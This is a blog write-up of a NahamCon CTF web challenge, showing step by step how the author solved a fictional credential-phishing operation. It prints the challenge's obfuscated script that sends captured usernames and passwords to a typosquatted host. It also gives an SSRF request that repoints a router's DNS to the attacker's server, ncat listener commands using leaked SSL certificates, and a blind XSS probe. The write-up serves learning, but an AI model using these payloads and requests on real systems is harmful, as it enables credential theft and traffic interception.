---
source: zlz-buerhaus
source_url: https://buer.haus/2020/06/14/nahamcon-trash-the-cache-write-up-web-1000/
title: "NahamCon – Trash the Cache Write-up (Web 1000) | ziot"
---

[< Back](https://buer.haus/)

I recently participated in the NahamCon CTF with the team Hacking for Soju. I was unable to complete this challenge before the end of the CTF, but managed to solve it the following day. Credits to maneolt and xehle for sharing notes and giving me a couple nudges.

Shout-out to the challenge creator [Adam Langley](https://twitter.com/adamtlangley) (give him a follow) for keeping the hype going after the CTF ended and also making one of the better web CTFs I have seen!

It starts with [Hackbookagram.com](https://hackbookagram.com/)

[![](http://buer.haus/wp-content/uploads/2020/06/hackbookagram-1024x426.png)](http://buer.haus/wp-content/uploads/2020/06/hackbookagram.png)

In the page source, you discover the following:

```

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmaneger.com/gtag/js?id=UA-978312237-6"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-978312237-6');
    </script>
```

You can spot an evil domain:

https://www.googletagmaneger.com/gtag/js

At the bottom of the JavaScript, you find the following:

```

var bb = 'lo';var cd='Btn';var ccr='gin';document.getElementById( bb + ccr + cd ).addEventListener("click",function(){var a_1 = 'htt';var a_2 = 'ps://';var a_3 = 'hac';var a_4 = 'kboo';var a_5 = 'kag';var a_6 = 'ram';var a_7 = '.c';var a_8 = 'om/';var a_9 = 'log';var a_10 = 'in';var e=new XMLHttpRequest;e.open("POST",a_1 + a_2 + a_3 + a_4 + a_5 + a_6 + a_7 + a_8  + a_9  + a_10,!0),e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.onload=function(){var t=JSON.parse(e.responseText);if(console.log(),201==e.status){var n=btoa("username="+document.getElementById("username").value+"&password="+document.getElementById("password").value);document.body.innerHTML=document.body.innerHTML+'',window.location=t[0]}else alert(t[0])},e.send("username="+document.getElementById("username").value+"&password="+document.getElementById("password").value),event.stopImmediatePropagation()});
})();
```

The important bits of this are:

```

var n = btoa("username=" + document.getElementById("username").value + "&password=" + document.getElementById("password").value);
https://www.googletagmaneger.com/event?e=' + n + '
```

It base64 encodes username=&password= and sends it to

```
/event?e=
```

. I put in an <img src=""> tag inside username just testing for a basic blind XSS / HTML injection and got the following hit:

```
178.62.61.49 - - [14/Jun/2020:16:36:45 +0000] "GET /imgtest HTTP/1.1" 404 3807 "https://www.googletagmaneger.com/view/a3e4ddefccd4d6ba506febedef7ccbc3" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.97 Safari/537.36"
```

Since it's a headless chrome, we know it'll parse JavaScript. After writing some code, I found that this was the page content:

```
<head></head><body><script>window.alert = null;window.confirm=null;</script>Username: <img src="https://xss.buer.haus/imgtest"><script src="https://xss.buer.haus/jstest.js"></script></body>
```

Not only is the response useless, but the browser also had no cookies for this host. maneolt gave me a nudge here and told me to look at the IP.

http://178.62.61.49

[![](http://buer.haus/wp-content/uploads/2020/06/faster-1024x339.png)](http://buer.haus/wp-content/uploads/2020/06/faster.png)

Now we have a new website to play with. The first thing was to look at the source and discover this JS file:

http://178.62.61.49/js/public.js

```
$('.connection-test').click( function(){
    $.post('/connection-test',{ node: 'us1'},function(resp){
        $('.connection-result').html('<div class="alert alert-success"><p>' + resp + '</p></div>');
    }).fail( function(resp){
        $('.connection-result').html('<div class="alert alert-danger"><p>' + resp.responseJSON[0] + '</p></div>');
    });
});
```

Not much, but we see connection-test with a node value of "us1". Given a "connection-test", the first thing I thought was to test this for SSRF. "us1" would return "\["Connection Successful"\]". Anything else would always return "\["Connection Error"\]". Knowing it's a router, we make an assumption that node is a subdomain and that we can maybe control the whole URL of the request, but perhaps we're hitting some sort of outbound restriction such as firewall rules.

Boom! Full response SSRF when trying to hit 192.168.1.1

[![](http://buer.haus/wp-content/uploads/2020/06/ssrf-1024x331.png)](http://buer.haus/wp-content/uploads/2020/06/ssrf.png)

In the response we get the following things of interest:

```

<div><input class="form-control" name="i_username" value="6422451584@fasternetbb.dsl"></div>
<div><input class="form-control" type="password" name="i_password" value="Bpi5!9fiLeikmeHmN"></div>
<div><input class="form-control" name="dns_server" value="8.8.8.8"></div>
<script src="/js/private.js"></script>
```

The /js/private.js gives the following:

```

$('.setConnection').click( function(){
    var username = $('input[name="i_username"]').val();
    var password = $('input[name="i_password"]').val();
    $.get('/set/connection?username=' + username +'&password=' + password ,function(resp){
       alert(resp);
    });
});

$('.setDNS').click( function(){
    var server = $('input[name="dns_server"]').val();
    $.get('/set/dns?server=' + server ,function(resp){
        alert(resp);
    });
});
```

`
`

``

So we have /set/connection and /set/dns. The /set/dns is probably the most interesting thing here because it's a router and if we can control DNS then we can intercept and poison connections.

I used this Python script with some slight modifications to setup DNS binding on my server:

https://gist.githubusercontent.com/pklaus/b5a7876d4d2cf7271873/raw/cb089513b185f4128d956eef6e0fb9f5fd583e41/ddnsserver.py

And I used the following ncat command:

ncat -lv 443

Then I sent the following:

```
POST /connection-test HTTP/1.1
Host: 178.62.61.49
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 48
Connection: close

node=192.168.1.1/set/dns?server=173.230.148.114#
```

I got a hit! But, unfortunately, SSL. The only way we are going to read this data is by stealing SSL certs. This is when we go back to the www.googletagmaneger.com website.

After running the two wordlists supplied at the beginning of the challenge looking for directories, endpoints, and params, we discover the following endpoint:

https://www.googletagmaneger.com/event?include=asdf

[![](http://buer.haus/wp-content/uploads/2020/06/error-1024x288.png)](http://buer.haus/wp-content/uploads/2020/06/error.png)

There are quite a few interesting things here, but only one thing matters:

- it's an xdebug error, I spent awhile trying to see if I could initiate xdebug
- it's an error that suggests LFI, but @ and / are filtered.
- We have some file paths that don't seem to work

After a bit of effort, it was discovered by using the site IP, we could access this file:

http://142.93.46.249/datacollection/controllers/Website.php

From here we run the wordlists again to see if we can find anything interesting. That's when you find the SSL certs!

http://142.93.46.249/datacollection/ssl/

Now that we have the certs, we can try again:

Setup our dns server:

```
python3 dns.py --port 53 --udp
```

Setup our listener using the cert:

```
ncat -lv 443 --ssl-cert=/home/CTF/certs/fullchain.pem --ssl-key=/home/CTF/certs/privkey.pem
```

Then we send our SSRF /set/dns request again. Anddd....!

```

Ncat: Connection from 178.62.61.49:50284.
GET /api/poll HTTP/1.1
Host: www.googletagmaneger.com
User-Agent: curl/7.58.0
Accept: /
X-Token: 779549E7865D034D9A9DB34401DA2157
```

Now we have an API token for /api/poll. So we send the request to see what we get ....

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 14 Jun 2020 21:05:30 GMT
Content-Type: application/json
Connection: close
Content-Length: 58

{"description":"Latest Usernames and Passwords","data":[]}
```

Nothing! Of course. Back to content discovery. Eventually with some bruteforcing, you find POST /api/cookie. This gives you the following:

```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 14 Jun 2020 20:23:16 GMT
Content-Type: application/json
Connection: close
Content-Length: 212

{"description":"Login Cookie","data":"NzQ1NWYxYmJkYzczM2YwYTkzMzg2MjE5MmIxNTFhN2VlNGI0NmQyM2EwYjNlMzBiMzc3NGE2NTVhYzE5MzBiMDE1MWY2NGQ5MzE1ZjJhZmEzY2VlYTcyZDFlNjNmMjQ3YTZhNTQzM2U1ODBjOWIzZGJhYWQyMmNiZTcxYzU5NTA="}
```

During content discovery, you should have also found that /logout redirects. That request sets a cookie, which looks like this:

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 14 Jun 2020 21:06:42 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: user-login-cookie=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Location: /login
Content-Length: 0
```

So we send a request to /index with the cookie:

```
user-login-cookie=NzQ1NWYxYmJkYzczM2YwYTkzMzg2MjE5MmIxNTFhN2VlNGI0NmQyM2EwYjNlMzBiMzc3NGE2NTVhYzE5MzBiMDE1MWY2NGQ5MzE1ZjJhZmEzY2VlYTcyZDFlNjNmMjQ3YTZhNTQzM2U1ODBjOWIzZGJhYWQyMmNiZTcxYzU5NTA=;
```

[![](http://buer.haus/wp-content/uploads/2020/06/dashboard-1024x390.png)](http://buer.haus/wp-content/uploads/2020/06/dashboard.png)

We load it up in a browser and click the delete button.

[![](http://buer.haus/wp-content/uploads/2020/06/fin-1024x567.png)](http://buer.haus/wp-content/uploads/2020/06/fin.png)

Finished!